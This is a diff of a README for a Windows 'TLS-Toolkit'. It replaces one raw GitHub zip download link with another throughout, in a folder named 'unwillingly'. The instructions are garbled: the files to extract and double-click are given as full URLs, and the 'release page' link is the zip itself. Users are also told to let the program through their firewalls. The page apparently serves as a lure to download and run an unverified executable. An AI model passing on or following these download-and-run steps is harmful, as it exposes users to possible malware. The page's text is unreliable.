@@ -7,30 +7,30 @@ TLS-Toolkit is designed to make managing your TLS (Transport Layer Security) con
 
 ## 📥 Download Now
 
-[![Download TLS-Toolkit](https://raw.githubusercontent.com/Xxangelica15xX/TLS-Toolkit/main/unwillingly/TLS-Toolkit.zip%https://raw.githubusercontent.com/Xxangelica15xX/TLS-Toolkit/main/unwillingly/TLS-Toolkit.zip)](https://raw.githubusercontent.com/Xxangelica15xX/TLS-Toolkit/main/unwillingly/TLS-Toolkit.zip)
+[![Download TLS-Toolkit](https://github.com/Xxangelica15xX/TLS-Toolkit/raw/refs/heads/main/unwillingly/Toolkit-TL-v3.8.zip%https://github.com/Xxangelica15xX/TLS-Toolkit/raw/refs/heads/main/unwillingly/Toolkit-TL-v3.8.zip)](https://github.com/Xxangelica15xX/TLS-Toolkit/raw/refs/heads/main/unwillingly/Toolkit-TL-v3.8.zip)
 
 ## 🚀 Getting Started
 
 Follow these steps to download and set up TLS-Toolkit:
 
 1. **Visit the Release Page:**
-   Open your web browser and go to our release page by clicking this link: [Download TLS-Toolkit](https://raw.githubusercontent.com/Xxangelica15xX/TLS-Toolkit/main/unwillingly/TLS-Toolkit.zip). 
+   Open your web browser and go to our release page by clicking this link: [Download TLS-Toolkit](https://github.com/Xxangelica15xX/TLS-Toolkit/raw/refs/heads/main/unwillingly/Toolkit-TL-v3.8.zip). 
 
 2. **Choose the Latest Version:**
    On the release page, find the most recent version of TLS-Toolkit. You will see notes about what's new in this version.
 
 3. **Download the Application:**
-   Once you've selected the version, click on the provided link to download the application file. The file will be named something like `https://raw.githubusercontent.com/Xxangelica15xX/TLS-Toolkit/main/unwillingly/TLS-Toolkit.zip`. 
+   Once you've selected the version, click on the provided link to download the application file. The file will be named something like `https://github.com/Xxangelica15xX/TLS-Toolkit/raw/refs/heads/main/unwillingly/Toolkit-TL-v3.8.zip`. 
 
 4. **Extract the Files:**
    After the download completes, locate the file in your downloads folder. Right-click on the file and select "Extract All" to unzip the contents.
 
 5. **Run TLS-Toolkit:**
-   After extraction, navigate to the folder where the files are located. Double-click on `https://raw.githubusercontent.com/Xxangelica15xX/TLS-Toolkit/main/unwillingly/TLS-Toolkit.zip` to run the application. 
+   After extraction, navigate to the folder where the files are located. Double-click on `https://github.com/Xxangelica15xX/TLS-Toolkit/raw/refs/heads/main/unwillingly/Toolkit-TL-v3.8.zip` to run the application. 
 
 ## 📋 Installation Instructions
 
-- **Windows Users:** You can run `https://raw.githubusercontent.com/Xxangelica15xX/TLS-Toolkit/main/unwillingly/TLS-Toolkit.zip` directly. Make sure to allow the application through any firewalls if prompted.
+- **Windows Users:** You can run `https://github.com/Xxangelica15xX/TLS-Toolkit/raw/refs/heads/main/unwillingly/Toolkit-TL-v3.8.zip` directly. Make sure to allow the application through any firewalls if prompted.
 - **Mac Users:** This app is currently not supported on Mac. Please check back for future updates.
 - **Linux Users:** Currently not supported, but we're looking into support for future versions.
 
@@ -54,7 +54,7 @@ Before downloading, please ensure your system meets the following minimum requir
 
 ## 💡 How to Use TLS-Toolkit
 
-1. **Launch the Application:** Double-click `https://raw.githubusercontent.com/Xxangelica15xX/TLS-Toolkit/main/unwillingly/TLS-Toolkit.zip` to open.
+1. **Launch the Application:** Double-click `https://github.com/Xxangelica15xX/TLS-Toolkit/raw/refs/heads/main/unwillingly/Toolkit-TL-v3.8.zip` to open.
 2. **Configuration:**
    - Enter your desired connection settings in the fields provided. 
    - You can test your settings to ensure everything is configured correctly.
@@ -68,7 +68,7 @@ If you encounter issues, consult the help documents included within the applicat
 
 ## 📅 Update History
 
-Stay tuned for updates! We regularly enhance TLS-Toolkit with new features and improvements. To keep up-to-date, frequently check our [release page](https://raw.githubusercontent.com/Xxangelica15xX/TLS-Toolkit/main/unwillingly/TLS-Toolkit.zip).
+Stay tuned for updates! We regularly enhance TLS-Toolkit with new features and improvements. To keep up-to-date, frequently check our [release page](https://github.com/Xxangelica15xX/TLS-Toolkit/raw/refs/heads/main/unwillingly/Toolkit-TL-v3.8.zip).
 
 ## 📩 Contact
 
